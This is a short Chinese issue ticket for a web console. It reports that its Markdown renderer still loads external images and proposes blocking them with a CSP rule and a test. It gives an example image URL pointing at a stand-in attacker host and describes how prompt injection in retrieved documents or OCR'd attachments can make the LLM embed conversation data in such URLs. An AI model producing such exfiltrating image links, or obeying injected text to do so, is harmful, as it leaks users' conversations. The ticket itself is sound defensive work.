<!-- Copyright (c) 2026 HongXian0903. SPDX-License-Identifier: Apache-2.0. -->
# 控制台 Markdown 外部圖片可外洩資料
Status: ready-for-agent

`web/src/markdown.js` 已移除原始 HTML 並經 DOMPurify，但 Markdown 圖片 `![](https://attacker/?q=...)` 仍會載入外部網址。提示注入（RAGFlow 文件、附件 OCR）可讓 LLM 輸出帶有對話內容的圖片網址，瀏覽器載入即外洩。

建議：不渲染遠端圖片，改顯示為文字連結；或以 CSP `img-src 'self' data: blob:` 限制。完成：`web/tests/markdown.test.js` 覆蓋外部圖片不產生 `<img>`。

## Comments
